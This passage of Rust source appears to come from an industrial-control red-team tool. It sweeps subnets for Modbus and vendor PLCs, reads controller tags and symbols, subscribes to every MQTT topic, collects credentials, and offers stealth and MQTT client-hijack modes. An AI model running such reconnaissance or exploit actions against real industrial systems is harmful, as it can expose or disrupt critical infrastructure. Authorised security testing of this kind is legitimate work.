            fields.insert("protocol".into(), Value::String("modbus_tcp".into()));
            fields.insert("discovery_transport".into(), Value::String("tcp".into()));
            fields.insert("cap_modbus_tcp".into(), Value::Bool(responded));
            let msg = if responded {
                format!("[+] Modbus TCP: {} responded on port {port}", target.ip)
            } else {
                format!(
                    "[!] {} - no Modbus response on port {port}; stored for manual ops",
                    target.ip
                )
            };
            let _ = tx.send(ScanEvent::Output(msg));
            let _ = tx.send(ScanEvent::DeviceFound(DeviceInfo {
                vendor: "modbus".into(),
                ip: target.ip.clone(),
                fields,
            }));
            let _ = tx.send(ScanEvent::Done(format!("Scan of {label} complete")));
            return;
        }

        if target.should_try_schneider() {
            use casket::core::modbus;
            use casket::vendors::schneider::scan;

            let port = target.port.unwrap_or(modbus::DEFAULT_PORT);
            let transport = target.transport.unwrap_or(TargetTransport::Both);
            let _ = tx.send(ScanEvent::Output(format!(
                "[*] Schneider targeted scan ({}, TCP port {port})...",
                target_transport_label(transport)
            )));
            if let Ok(devs) = scan::scan_ip_with_transport(
                &target.ip,
                3,
                true,
                port,
                schneider_transport(transport),
            ) {
                if let Some(dev) = devs
                    .into_iter()
                    .find(|d| d.identity_match || d.name.is_some() || d.firmware.is_some())
                {
                    let name = dev
                        .name
                        .clone()
                        .unwrap_or_else(|| "Schneider-compatible".into());
                    let _ = tx.send(ScanEvent::Output(format!(
                        "[+] Schneider: {} ({name})",
                        target.ip
                    )));
                    let _ = tx.send(ScanEvent::DeviceFound(schneider_device_info(dev)));
                    let _ = tx.send(ScanEvent::Done(format!("Scan of {label} complete")));
                    return;
                }
            }

            if target.transport.is_some() {
                let _ = tx.send(ScanEvent::Output(format!(
                    "[-] {label} - no Schneider response"
                )));
                let _ = tx.send(ScanEvent::Done(format!(
                    "Scan of {label} complete (no result)"
                )));
                return;
            }
        }

        let all = probe_all(&target.ip, 8);
        match all.len() {
            0 => {
                // probe_all found nothing — try Modbus TCP as a silent fallback
                {
                    use casket::core::modbus;
                    use std::net::{SocketAddr, TcpStream};
                    use std::time::Duration;
                    let mb_port = target.port.unwrap_or(modbus::DEFAULT_PORT);
                    let addr_str = format!("{}:{}", target.ip, mb_port);
                    if let Ok(addr) = addr_str.parse::<SocketAddr>() {
                        if TcpStream::connect_timeout(&addr, Duration::from_secs(1)).is_ok()
                            && modbus::read_holding_registers(&target.ip, mb_port, 0, 1).is_ok()
                        {
                            let _ = tx.send(ScanEvent::Output(format!(
                                "[+] Modbus TCP: {}:{mb_port}",
                                target.ip
                            )));
                            let mut fields = HashMap::new();
                            fields.insert("port".into(), Value::Number(i64::from(mb_port).into()));
                            fields.insert(
                                "modbus_port".into(),
                                Value::Number(i64::from(mb_port).into()),
                            );
                            fields.insert("protocol".into(), Value::String("modbus_tcp".into()));
                            fields
                                .insert("discovery_transport".into(), Value::String("tcp".into()));
                            fields.insert("cap_modbus_tcp".into(), Value::Bool(true));
                            let _ = tx.send(ScanEvent::DeviceFound(DeviceInfo {
                                vendor: "modbus".into(),
                                ip: target.ip.clone(),
                                fields,
                            }));
                            let _ = tx.send(ScanEvent::Done(format!("Scan of {label} complete")));
                            return;
                        }
                    }
                }
                if let Some(port) = target.port {
                    let mut fields = HashMap::new();
                    fields.insert("port".into(), Value::Number(i64::from(port).into()));
                    let _ = tx.send(ScanEvent::DeviceFound(DeviceInfo {
                        vendor: "unknown".into(),
                        ip: target.ip.clone(),
                        fields,
                    }));
                    let _ = tx.send(ScanEvent::Output(format!(
                        "[!] {label} - no device identified; stored with custom port"
                    )));
                } else {
                    let _ = tx.send(ScanEvent::Output(format!(
                        "[-] {} \u{2014} no device identified",
                        target.ip
                    )));
                }
                let _ = tx.send(ScanEvent::Done(format!(
                    "Scan of {label} complete (no result)"
                )));
            }
            1 => {
                let info = all.into_iter().next().unwrap();
                let _ = tx.send(ScanEvent::Output(format!(
                    "[+] {} \u{2192} {}",
                    target.ip, info.vendor
                )));
                let _ = tx.send(ScanEvent::DeviceFound(info));
                let _ = tx.send(ScanEvent::Done(format!("Scan of {label} complete")));
            }
            _ => {
                let protocols: Vec<String> = all.iter().map(|d| d.vendor.clone()).collect();
                let proto_str = protocols.join(", ");
                let _ = tx.send(ScanEvent::Output(format!(
                    "[+] {} \u{2192} MULTI ({proto_str})",
                    target.ip
                )));
                let mut fields: HashMap<String, Value> = HashMap::new();
                fields.insert(
                    "protocols".into(),
                    Value::Array(protocols.iter().map(|p| Value::String(p.clone())).collect()),
                );
                for d in all {
                    let vf = serde_json::to_value(&d.fields).unwrap_or_default();
                    fields.insert(d.vendor, vf);
                }
                let _ = tx.send(ScanEvent::DeviceFound(DeviceInfo {
                    vendor: "multi".into(),
                    ip: target.ip.clone(),
                    fields,
                }));
                let _ = tx.send(ScanEvent::Done(format!("Scan of {label} complete")));
            }
        }
    });
}

fn spawn_broadcast_scan(scan_idx: usize, tx: mpsc::Sender<ScanEvent>) {
    std::thread::spawn(move || {
        let ifaces = get_interfaces();
        if ifaces.is_empty() {
            let _ = tx.send(ScanEvent::Done("No network interfaces found".into()));
            return;
        }
        let iface = ifaces[0].clone();
        let _ = tx.send(ScanEvent::Output(format!(
            "[*] Using interface {} ({})",
            iface.name, iface.ip
        )));

        if scan_idx == 0 {
            let _ = tx.send(ScanEvent::Output(
                "[*] Starting parallel broadcast scan...".into(),
            ));
            let mut handles = Vec::new();
            for vendor_idx in 1..=5 {
                let tx2 = tx.clone();
                let iface2 = iface.clone();
                handles.push(std::thread::spawn(move || {
                    run_vendor_broadcast(vendor_idx, &iface2, &tx2);
                }));
            }
            for h in handles {
                let _ = h.join();
            }
            let _ = tx.send(ScanEvent::Done("Parallel broadcast scan complete".into()));
        } else {
            run_vendor_broadcast(scan_idx, &iface, &tx);
            let _ = tx.send(ScanEvent::Done(format!(
                "{} scan complete",
                SCAN_ITEMS[scan_idx]
            )));
        }
    });
}

fn run_vendor_broadcast(vendor_idx: usize, iface: &NetworkInterface, tx: &mpsc::Sender<ScanEvent>) {
    match vendor_idx {
        1 => scan_broadcast_beckhoff(iface, tx),
        2 => scan_broadcast_enip(iface, tx),
        3 => scan_broadcast_schneider(iface, tx),
        4 => scan_broadcast_mitsubishi(iface, tx),
        5 => scan_broadcast_ewon(iface, tx),
        6 => scan_broadcast_modbus(iface, tx),
        _ => {}
    }
}

fn scan_broadcast_beckhoff(iface: &NetworkInterface, tx: &mpsc::Sender<ScanEvent>) {
    use casket::vendors::beckhoff::scan;
    if let Ok(devs) = scan::discover(iface, 3, true) {
        for d in devs {
            let ip = d.ip.clone();
            if ip.parse::<std::net::IpAddr>().is_err() {
                continue;
            }
            let _ = tx.send(ScanEvent::Output(format!(
                "[+] Beckhoff: {ip} ({}, {})",
                d.name, d.tc_version
            )));
            let _ = tx.send(ScanEvent::DeviceFound(beckhoff_device_info(d, None)));
        }
    }
}

fn scan_broadcast_enip(iface: &NetworkInterface, tx: &mpsc::Sender<ScanEvent>) {
    use casket::vendors::enip::scan;
    if let Ok(devs) = scan::scan(iface, 3, true) {
        for d in devs {
            let ip = d.ip.clone();
            if ip.parse::<std::net::IpAddr>().is_err() {
                continue;
            }
            let vendor_id_u32 = u32::from_str_radix(&d.vendor_id, 16).unwrap_or(0);
            let vendor = if [1u32, 5, 77].contains(&vendor_id_u32) {
                "rockwell"
            } else {
                "enip"
            };
            let _ = tx.send(ScanEvent::Output(format!(
                "[+] EtherNet/IP: {ip} ({})",
                d.product_name
            )));
            let mut fields = HashMap::new();
            fields.insert("product_name".into(), Value::String(d.product_name));
            fields.insert("vendor_id".into(), Value::String(d.vendor_id));
            fields.insert("revision".into(), Value::String(d.revision));
            fields.insert("port".into(), Value::Number(44818i64.into()));
            fields.insert("enip_port".into(), Value::Number(44818i64.into()));
            fields.insert("cap_enip_tcp_identity".into(), Value::Bool(true));
            let _ = tx.send(ScanEvent::DeviceFound(DeviceInfo {
                vendor: vendor.into(),
                ip,
                fields,
            }));
        }
    }
}

fn scan_broadcast_schneider(iface: &NetworkInterface, tx: &mpsc::Sender<ScanEvent>) {
    use casket::vendors::schneider::scan;
    if let Ok(devs) = scan::scan(iface, 3, true) {
        for d in devs {
            let ip = d.ip.clone();
            if ip.parse::<std::net::IpAddr>().is_err() {
                continue;
            }
            let name = d.name.clone().unwrap_or_default();
            let _ = tx.send(ScanEvent::Output(format!("[+] Schneider: {ip} ({name})")));
            let _ = tx.send(ScanEvent::DeviceFound(schneider_device_info(d)));
        }
    }
}

fn scan_broadcast_mitsubishi(iface: &NetworkInterface, tx: &mpsc::Sender<ScanEvent>) {
    use casket::vendors::mitsubishi::scan;
    if let Ok(devs) = scan::scan(iface, 3, true) {
        for d in devs {
            let ip = d.ip.clone();
            if ip.parse::<std::net::IpAddr>().is_err() {
                continue;
            }
            let _ = tx.send(ScanEvent::Output(format!(
                "[+] Mitsubishi: {ip} ({})",
                d.plc_type
            )));
            let _ = tx.send(ScanEvent::DeviceFound(mitsubishi_device_info(d)));
        }
    }
}

fn scan_broadcast_ewon(iface: &NetworkInterface, tx: &mpsc::Sender<ScanEvent>) {
    use casket::vendors::ewon::scan;
    if let Ok(devs) = scan::scan(iface, 3, true) {
        for d in devs {
            if d.response_type != "device_info" {
                continue;
            }
            if let Some(ip) = d.ip {
                if ip.parse::<std::net::IpAddr>().is_err() {
                    continue;
                }
                let serial = d.serial.clone().unwrap_or_default();
                let _ = tx.send(ScanEvent::Output(format!(
                    "[+] eWON: {ip} (serial={serial})"
                )));
                let mut fields = HashMap::new();
                if let Some(mac) = d.mac {
                    fields.insert("mac".into(), Value::String(mac));
                }
                if !serial.is_empty() {
                    fields.insert("serial".into(), Value::String(serial));
                }
                fields.insert("http_port".into(), Value::Number(80i64.into()));
                fields.insert("cap_ewon_ipconf".into(), Value::Bool(true));
                fields.insert("cap_ewon_http_candidate".into(), Value::Bool(true));
                let _ = tx.send(ScanEvent::DeviceFound(DeviceInfo {
                    vendor: "ewon".into(),
                    ip,
                    fields,
                }));
            }
        }
    }
}

/// Returns `(network_address, host_bit_count)` for the given IP and netmask.
fn compute_sweep_prefix(ip: std::net::Ipv4Addr, mask: std::net::Ipv4Addr) -> (std::net::Ipv4Addr, u32) {
    let net = u32::from(ip) & u32::from(mask);
    let host_bits = (!u32::from(mask)).count_ones();
    (std::net::Ipv4Addr::from(net), host_bits)
}

fn scan_broadcast_modbus(iface: &NetworkInterface, tx: &mpsc::Sender<ScanEvent>) {
    use casket::core::modbus;
    use std::net::{IpAddr, Ipv4Addr, SocketAddr, TcpStream};
    use std::time::Duration;

    let Ok(local_ip) = iface.ip.parse::<IpAddr>() else {
        let _ = tx.send(ScanEvent::Output(
            "[-] Cannot parse local interface IP".into(),
        ));
        return;
    };
    let IpAddr::V4(v4) = local_ip else {
        let _ = tx.send(ScanEvent::Output(
            "[-] IPv6 interface; Modbus sweep requires IPv4".into(),
        ));
        return;
    };

    let mask: Ipv4Addr = iface
        .netmask
        .parse()
        .unwrap_or(Ipv4Addr::new(255, 255, 255, 0));
    let (net, host_bits) = compute_sweep_prefix(v4, mask);

    let (prefix, host_range): (String, Vec<u32>) = if host_bits > 8 {
        // Subnet wider than /24 — sweeping the full range could mean 65k+ hosts.
        // Fall back to the /24 that contains the local address.
        let _ = tx.send(ScanEvent::Output(
            "[!] Subnet is wider than /24; sweeping only the /24 containing the local address".into(),
        ));
        let octets = v4.octets();
        let p = format!("{}.{}.{}.", octets[0], octets[1], octets[2]);
        (p, (1u32..=254).collect())
    } else {
        let net_u32 = u32::from(net);
        let host_count = (1u32 << host_bits).saturating_sub(2);
        let p = format!("{net}");
        // We'll build full addresses below, so the "prefix" is the network base u32.
        let _ = p; // use net_u32 directly
        let base = net_u32;
        let addrs: Vec<u32> = (1..=host_count).map(|i| base + i).collect();
        (String::new(), addrs)
    };

    let hosts: Vec<String> = if prefix.is_empty() {
        // Normal netmask path: host_range contains full u32 addresses.
        host_range
            .into_iter()
            .map(|addr| Ipv4Addr::from(addr).to_string())
            .collect()
    } else {
        // Wide-subnet fallback: host_range contains last-octet values 1..=254.
        host_range
            .into_iter()
            .map(|i| format!("{prefix}{i}"))
            .collect()
    };

    let display_range = hosts
        .first()
        .and_then(|f| hosts.last().map(|l| format!("{f} – {l}")))
        .unwrap_or_default();
    let _ = tx.send(ScanEvent::Output(format!(
        "[*] Modbus TCP sweep: {display_range} port 502 (batches of 32)..."
    )));
    for batch in hosts.chunks(32) {
        let handles: Vec<_> = batch
            .iter()
            .map(|ip| {
                let ip = ip.clone();
                let tx2 = tx.clone();
                std::thread::spawn(move || {
                    let addr: SocketAddr = match format!("{ip}:502").parse() {
                        Ok(a) => a,
                        Err(_) => return,
                    };
                    if TcpStream::connect_timeout(&addr, Duration::from_secs(1)).is_err() {
                        return;
                    }
                    if modbus::read_holding_registers(&ip, 502, 0, 1).is_ok() {
                        let _ = tx2.send(ScanEvent::Output(format!("[+] Modbus TCP: {ip}:502")));
                        let mut fields = HashMap::new();
                        fields.insert("port".into(), Value::Number(502i64.into()));
                        fields.insert("modbus_port".into(), Value::Number(502i64.into()));
                        fields.insert("protocol".into(), Value::String("modbus_tcp".into()));
                        fields.insert("discovery_transport".into(), Value::String("tcp".into()));
                        fields.insert("cap_modbus_tcp".into(), Value::Bool(true));
                        let _ = tx2.send(ScanEvent::DeviceFound(DeviceInfo {
                            vendor: "modbus".into(),
                            ip: ip.clone(),
                            fields,
                        }));
                    }
                })
            })
            .collect();
        for h in handles {
            let _ = h.join();
        }
    }
}

// ─── Exploit runners ─────────────────────────────────────────────────────────

/// Classify a Rockwell tag by its I/O suffix.
/// Returns "Input", "Output", "Config", or "User".
fn tag_access_class(name: &str) -> &'static str {
    if let Some(pos) = name.rfind(':') {
        let suffix = &name[pos + 1..];
        let mut chars = suffix.chars();
        let first = chars.next().unwrap_or('_');
        let rest_digits = chars.all(|c| c.is_ascii_digit());
        if rest_digits {
            match first {
                'I' => return "Input",
                'O' => return "Output",
                'C' => return "Config",
                _ => {}
            }
        }
    }
    "User"
}

/// Column header + rule for the Rockwell tag table.
fn tag_header() -> [String; 2] {
    [
        format!(
            "  {:>6}  {:<42}  {:<14}  {:<4}  {:<18}  {:<9}  {}",
            "#", "Name", "Type", "Dims", "Value", "Type Word", "Access"
        ),
        format!(
            "  {:─>6}  {:─<42}  {:─<14}  {:─<4}  {:─<18}  {:─<9}  {:─<6}",
            "", "", "", "", "", "", ""
        ),
    ]
}

/// Format one tag row: widths match `tag_header()`.
///
/// `base`: base type name (e.g. "BOOL", "DINT", "STRUCT(0x012)")
/// `dims`: dimension label ("1D" / "2D" / "3D" / "-")
/// `value`: decoded live value, or "[struct]" / "[array]" / "-"
/// `raw`: raw 2-byte type word
fn fmt_tag_row(
    instance_id: i64,
    name: &str,
    base: &str,
    dims: &str,
    value: &str,
    raw: i64,
) -> String {
    let access = tag_access_class(name);
    format!(
        "  {instance_id:>6}  {name:<42}  {base:<14}  {dims:<4}  {value:<18}  0x{raw:04x}  {access:<6}"
    )
}

fn run_exploit_for(
    vendor: &str,
    idx: usize,
    ip: &str,
    port: u16,
    input: &str,
    label: &str,
    tx: mpsc::Sender<ScanEvent>,
) {
    let vendor = vendor.to_lowercase();
    let ip = ip.to_string();
    let input = input.to_string();
    let label = label.to_string();

    std::thread::spawn(move || {
        struct DoneGuard {
            tx: mpsc::Sender<ScanEvent>,
            msg: String,
        }
        impl Drop for DoneGuard {
            fn drop(&mut self) {
                let _ = self.tx.send(ScanEvent::Done(std::mem::take(&mut self.msg)));
            }
        }
        let _guard = DoneGuard {
            tx: tx.clone(),
            msg: format!("{label} @ {ip}"),
        };

        let ip2 = ip.clone();
        let tx2 = tx.clone();
        let out = move |msg: &str| {
            if let Some(rest) = msg.strip_prefix("[CRED] ") {
                if let Some((user, pass)) = rest.split_once(':') {
                    let _ = tx2.send(ScanEvent::CredFound {
                        ip: ip2.clone(),
                        username: user.to_string(),
                        password: pass.to_string(),
                    });
                }
            }
            let _ = tx2.send(ScanEvent::Output(msg.to_string()));
        };

        // For Siemens actions, look up any previously stored device password.
        let stored_pw: Option<String> = if vendor == "siemens" {
            use crate::db::Database;
            Database::open(&Database::default_path())
                .ok()
                .and_then(|db| db.load_devices().ok())
                .and_then(|devs| devs.into_iter().find(|d| d.ip == ip))
                .and_then(|dev| dev.fields["password"].as_str().map(str::to_string))
        } else {
            None
        };

        dispatch_exploit(&vendor, idx, &ip, port, &input, stored_pw.as_deref(), out, &tx);
    });
}

#[allow(clippy::cognitive_complexity, clippy::too_many_arguments)]
fn dispatch_exploit(
    vendor: &str,
    idx: usize,
    ip: &str,
    port: u16,
    input: &str,
    stored_password: Option<&str>,
    out: impl Fn(&str),
    tx: &mpsc::Sender<ScanEvent>,
) {
    // Actions that return structured tag data must be handled inline here so
    // they can forward ScanEvent::TagLeaves to the TUI channel.
    match (vendor, idx) {
        ("beckhoff", 7) => {
            exploit_beckhoff_symbols(ip, port, &out, tx);
            return;
        }
        ("phoenix", 1) => {
            let tags = crate::ops::exploit_phoenix_list_tags(ip, port, &out);
            if !tags.is_empty() {
                let _ = tx.send(ScanEvent::TagLeaves {
                    ip: ip.to_string(),
                    port,
                    vendor: vendor.to_string(),
                    leaves: tags.into_iter().map(|n| (n, true)).collect(),
                });
            }
            return;
        }
        ("phoenix", 2) => {
            let tags = crate::ops::exploit_phoenix_read_tags(ip, port, &out);
            if !tags.is_empty() {
                let _ = tx.send(ScanEvent::TagLeaves {
                    ip: ip.to_string(),
                    port,
                    vendor: vendor.to_string(),
                    leaves: tags.into_iter().map(|n| (n, true)).collect(),
                });
            }
            return;
        }
        ("ewon", 1) => {
            out(&format!("Reading tags from eWON at {ip}…"));
            match casket::vendors::ewon::scan::read_tag_values(ip, port, None) {
                Ok(tags) => {
                    let leaves: Vec<(String, bool)> =
                        tags.iter().map(|(n, _)| (n.clone(), false)).collect();
                    for (name, val) in &tags {
                        out(&format!("  {name}: {val}"));
                    }
                    out(&format!("{} tag(s).", tags.len()));
                    let _ = tx.send(ScanEvent::TagLeaves {
                        ip: ip.to_string(),
                        port,
                        vendor: vendor.to_string(),
                        leaves,
                    });
                }
                Err(e) => out(&format!("Error: {e}")),
            }
            return;
        }
        ("rockwell" | "enip", 1) => {
            let leaves = crate::ops::exploit_rockwell_tags(ip, port, &out);
            let _ = tx.send(ScanEvent::TagLeaves {
                ip: ip.to_string(),
                port,
                vendor: vendor.to_string(),
                leaves,
            });
            return;
        }
        ("mqtt", 1) => {
            let mqtt_port = if port == 0 {
                casket::vendors::mqtt::client::MQTT_PORT
            } else {
                port
            };
            let opts = ConnectOptions {
                host: ip.to_string(),
                port: mqtt_port,
                client_id: "scadaver-scan".to_string(),
                ..Default::default()
            };
            out(&format!(
                "Subscribing to all topics on {ip}:{mqtt_port} for 2 s…"
            ));
            match MqttSession::connect(&opts).and_then(|mut sess| {
                sess.subscribe("#", 0)?;
                std::thread::sleep(std::time::Duration::from_secs(2));
                Ok(sess.drain_messages())
            }) {
                Ok(msgs) => {
                    let mut topics: Vec<String> = msgs.iter().map(|m| m.topic.clone()).collect();
                    topics.sort();
                    topics.dedup();
                    let leaves: Vec<(String, bool)> =
                        topics.iter().map(|t| (t.clone(), true)).collect();
                    for t in &topics {
                        out(&format!("  {t}"));
                    }
                    out(&format!("{} topic(s).", topics.len()));
                    let _ = tx.send(ScanEvent::TagLeaves {
                        ip: ip.to_string(),
                        port: mqtt_port,
                        vendor: vendor.to_string(),
                        leaves,
                    });
                }
                Err(e) => out(&format!("Error: {e}")),
            }
            return;
        }
        _ => {}
    }

    // All other known actions delegate to the shared ops layer.
    let action_id = format!("{vendor}/{idx}");
    if !crate::ops::run_action(&action_id, ip, port, input, stored_password, &out) {
        // Unknown action — auto-detect all protocols.
        out(&format!("[*] Auto-detecting {ip}..."));
        let all = probe_all(ip, 8);
        match all.len() {
            0 => out(&format!("[-] {ip}: no device identified")),
            1 => {
                let info = all.into_iter().next().unwrap();
                out(&format!("[+] {} \u{2192} {}", ip, info.vendor));
                let _ = tx.send(ScanEvent::DeviceFound(info));
            }
            _ => {
                let protocols: Vec<String> = all.iter().map(|d| d.vendor.clone()).collect();
                out(&format!(
                    "[+] {} \u{2192} MULTI ({})",
                    ip,
                    protocols.join(", ")
                ));
                let mut fields: HashMap<String, Value> = HashMap::new();
                fields.insert(
                    "protocols".into(),
                    Value::Array(protocols.iter().map(|p| Value::String(p.clone())).collect()),
                );
                for d in all {
                    let vf = serde_json::to_value(&d.fields).unwrap_or_default();
                    fields.insert(d.vendor, vf);
                }
                let _ = tx.send(ScanEvent::DeviceFound(DeviceInfo {
                    vendor: "multi".into(),
                    ip: ip.to_string(),
                    fields,
                }));
            }
        }
    }
}

fn save_tags_and_diff(
    ip: &str,
    tags: &[casket::vendors::rockwell::driver::LogixTag],
    out: &impl Fn(&str),
) {
    use crate::db::Database;
    use casket::vendors::rockwell::driver;
    match Database::open(&Database::default_path()) {
        Ok(db) => {
            let data: Vec<(i64, &str, i64)> = tags
                .iter()
                .map(|t| {
                    let raw = t.tag_type;
                    let norm = if raw & 0x8000 == 0 && (raw & 0xFF) <= 0x1F {
                        (raw & 0x6000) | 0x00C1
                    } else {
                        raw
                    };
                    (i64::from(t.instance_id), t.name.as_str(), i64::from(norm))
                })
                .collect();
            match db.upsert_tags_for_protocol(ip, "rockwell", &data) {
                Ok(diff) if diff.is_empty() => {
                    out("[*] Tags saved: no changes since last scan");
                }
                Ok(diff) => {
                    out(&format!(
                        "[!] Tag changes: +{} added  -{} removed  ~{} type-changed",
                        diff.added.len(),
                        diff.removed.len(),
                        diff.type_changed.len(),
                    ));
                    for t in &diff.added {
                        out(&format!(
                            "  [+NEW] {:<40} : {}",
                            t.name,
                            driver::type_name(u16::try_from(t.tag_type).unwrap_or(u16::MAX))
                        ));
                    }
                    for t in &diff.removed {
                        out(&format!(
                            "  [-DEL] {:<40} : {}",
                            t.name,
                            driver::type_name(u16::try_from(t.tag_type).unwrap_or(u16::MAX))
                        ));
                    }
                    for c in &diff.type_changed {
                        out(&format!(
                            "  [~CHG] {:<40} : {} \u{2192} {}",
                            c.name,
                            driver::type_name(u16::try_from(c.old_type).unwrap_or(u16::MAX)),
                            driver::type_name(u16::try_from(c.new_type).unwrap_or(u16::MAX)),
                        ));
                    }
                }
                Err(e) => out(&format!("[!] Tag save failed: {e}")),
            }
        }
        Err(e) => out(&format!("[!] Cannot open DB to save tags: {e}")),
    }
}

fn exploit_rockwell_monitor(ip: &str, port: u16, out: &impl Fn(&str), stop: &Arc<AtomicBool>) {
    use casket::vendors::rockwell::driver;
    out(&format!("[*] Tag monitor started for {ip}"));
    out("[*] Fetching baseline tags...");

    // Initial baseline scan
    match driver::enumerate_tags(ip, port) {
        Ok(tags) => {
            out(&format!("[+] Baseline: {} tags", tags.len()));
            save_tags_and_diff(ip, &tags, out);
        }
        Err(e) => {
            out(&format!("[-] Baseline fetch failed: {e}"));
            return;
        }
    }

    out("[*] Polling every 30 s: fire another exploit or close zoom to stop");

    for poll in 1u32.. {
        // Sleep 30 s in 1-second ticks so the stop flag is checked promptly
        for _ in 0..30 {
            if stop.load(Ordering::Relaxed) {
                out("[*] Monitor stopped");
                return;
            }
            std::thread::sleep(Duration::from_secs(1));
        }
        if stop.load(Ordering::Relaxed) {
            out("[*] Monitor stopped");
            return;
        }

        let ts = {
            use std::time::{SystemTime, UNIX_EPOCH};
            let s = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .map_or(0, |d| d.as_secs());
            format!(
                "{:02}:{:02}:{:02} UTC",
                (s / 3600) % 24,
                (s / 60) % 60,
                s % 60
            )
        };
        out(&format!("[*] Poll #{poll} at {ts}"));

        match driver::enumerate_tags(ip, port) {
            Ok(tags) => save_tags_and_diff(ip, &tags, out),
            Err(e) => out(&format!("[-] Poll failed: {e}")),
        }
    }
}

fn save_and_diff(
    ip: &str,
    protocol: &str,
    points: &[(&str, Option<&str>, &str)],
    out: &impl Fn(&str),
) {
    use crate::db::Database;
    let db = match Database::open(&Database::default_path()) {
        Ok(d) => d,
        Err(e) => {
            out(&format!("[!] Cannot open DB: {e}"));
            return;
        }
    };
    match db.upsert_data_points(ip, protocol, points) {
        Ok(diff) if diff.is_empty() => out("[*] Saved: no changes since last scan"),
        Ok(diff) => {
            out(&format!(
                "[!] Changes: +{} added  -{} removed  ~{} value-changed",
                diff.added.len(),
                diff.removed.len(),
                diff.value_changed.len(),
            ));
            for c in &diff.value_changed {
                let old = c.old_value.as_deref().unwrap_or("-");
                out(&format!(
                    "  [~CHG] {:<36} : {} \u{2192} {}",
                    c.address, old, c.new_value
                ));
            }
        }
        Err(e) => out(&format!("[!] DB save failed: {e}")),
    }
}

fn exploit_beckhoff_symbols(
    ip: &str,
    port: u16,
    out: &impl Fn(&str),
    tx: &mpsc::Sender<ScanEvent>,
) {
    use casket::vendors::beckhoff::{ads, scan};
    let local_netid = ads::build_local_netid(&local_ip_for(ip));
    out(&format!("[*] Enumerating ADS symbols on {ip}..."));
    let Some(dev) = scan::discover_ip_with_port(ip, 3, true, port)
        .ok()
        .and_then(|mut v| {
            if v.is_empty() {
                None
            } else {
                Some(v.remove(0))
            }
        })
    else {
        out("[-] No Beckhoff device responded");
        return;
    };
    let symbols = scan::enumerate_symbols(&dev, &local_netid, port);
    if symbols.is_empty() {
        out("[-] No symbols returned (device may not support ADS symbol upload)");
        return;
    }
    let [hdr, sep] = crate::ops::ads_symbol_header();
    out(&hdr);
    out(&sep);
    for s in &symbols {
        let value = s.value_str.as_deref().unwrap_or("-");
        out(&crate::ops::fmt_ads_symbol_row(&s.name, &s.type_name, value, s.size));
    }
    out(&sep);
    out(&format!("[+] {} symbol(s)", symbols.len()));
    let points: Vec<(&str, Option<&str>, &str)> = symbols
        .iter()
        .filter(|s| s.value_str.is_some())
        .map(|s| {
            (
                s.name.as_str(),
                Some(s.type_name.as_str()),
                s.value_str.as_deref().unwrap(),
            )
        })
        .collect();
    save_and_diff(ip, "ads", &points, out);
    let leaves: Vec<(String, bool)> = symbols.iter().map(|s| (s.name.clone(), true)).collect();
    let _ = tx.send(ScanEvent::TagLeaves {
        ip: ip.to_string(),
        port,
        vendor: "beckhoff".to_string(),
        leaves,
    });
}

// ─── Rendering ───────────────────────────────────────────────────────────────

fn draw(frame: &mut Frame, app: &mut App) {
    let size = frame.area();
    let root = Layout::default()
        .direction(Direction::Vertical)
        .constraints([
            Constraint::Length(3),
            Constraint::Min(0),
            Constraint::Length(5),
        ])
        .split(size);

    draw_header(frame, root[0], app);
    if app.mode == Mode::OutputZoom {
        draw_output_zoom(frame, root[1], app);
    } else {
        draw_main(frame, root[1], app);
    }
    draw_log_strip(frame, root[2], app);

    match app.mode {
        Mode::ScanMenu => draw_scan_menu(frame, size, app),
        Mode::Help => draw_help(frame, size),
        Mode::References => draw_references(frame, size, app),
        Mode::ExploitInput => draw_exploit_input_popup(frame, size, app),
        Mode::ExploitConfirm => draw_exploit_confirm_popup(frame, size, app),
        Mode::CacheRescanPrompt => draw_cache_rescan_popup(frame, size, app),
        Mode::VendorPicker => draw_vendor_picker(frame, size, app),
        _ => {}
    }

    if app.quit_confirm {
        draw_quit_confirm(frame, size);
    }
}

fn draw_header(frame: &mut Frame, area: Rect, app: &App) {
    let scan_tag = if app.active_jobs > 0 {
        format!(" \u{25cf} {} RUNNING", app.active_jobs)
    } else {
        String::new()
    };
    let stealth_tag = if app.stealth { " [STEALTH]" } else { "" };
    let title = format!(" SCADAver ICS Red Team Tool v1.0{scan_tag}{stealth_tag} ");
    let keys = match app.mode {
        Mode::Normal =>
            " [A] Add  [S] Scan  [E] Exploit  [I] Cursor  [O] Zoom  [M] MQTT  [U] Creds  [B] Refs  [R] Rescan  [D] Del  [/] Search  [C] Clear  [F] Fmt  [X] Export  [Z] Stealth  [?] Help  [Q] Quit",
        Mode::MqttMonitor =>
            " [j/k] Nav  [a] ACL  [r] Retain  [s] Session  [c] Clear  [/] Clear filter  [ESC/M] Disconnect",
        Mode::MqttClientIdInput => " Enter ClientID to hijack \u{2014} [ENTER] run  [ESC] cancel",
        Mode::MqttCredInput => " MQTT credentials: user:pass (empty = no auth) \u{2014} [ENTER] save  [ESC] cancel",
        Mode::IpInput => " Enter IP address \u{2014} [ESC] cancel",
        Mode::ExploitMenu => " [J/K] Navigate  [ENTER] Run  [V] View as protocol  [O] Zoom  [PgUp/PgDn] Scroll  [ESC] back",
        Mode::Search => " Type to filter \u{2014} [ESC] clear  [ENTER] confirm",
        Mode::ExploitInput => " Enter parameter \u{2014} [ENTER] run  [ESC] cancel",
        Mode::ExploitConfirm => " Type YES to confirm action \u{2014} [ENTER] confirm  [ESC] cancel",
        Mode::OutputZoom => " [J/K/PgUp/PgDn] Scroll  [G] Bottom  [g] Top  [/] Filter  [C] Clear  [O/ESC] Close",
        Mode::References => " [J/K/\u{2191}\u{2193}] Scroll  [B/ESC] Close",
        Mode::ImportInput => " nmap XML path \u{2014} [ENTER] import  [ESC] cancel",
        Mode::WordlistInput => " Wordlist path (empty = built-in defaults) \u{2014} [ENTER] save  [ESC] cancel",
        Mode::CacheRescanPrompt => " [Y] Rescan first  [N] Write with cached data  [ESC] cancel",
        _ => " [ESC / ?] back",
    };

    let text = vec![
        Line::from(Span::styled(
            title,
            Style::default()
                .fg(Color::Cyan)
                .add_modifier(Modifier::BOLD),
        )),
        Line::from(Span::styled(keys, Style::default().fg(Color::DarkGray))),
    ];
    let para = Paragraph::new(text).block(
        Block::default()
            .borders(Borders::ALL)
            .border_style(Style::default().fg(Color::Cyan)),
    );
    frame.render_widget(para, area);
}

fn draw_main(frame: &mut Frame, area: Rect, app: &mut App) {
    let chunks = Layout::default()
        .direction(Direction::Horizontal)
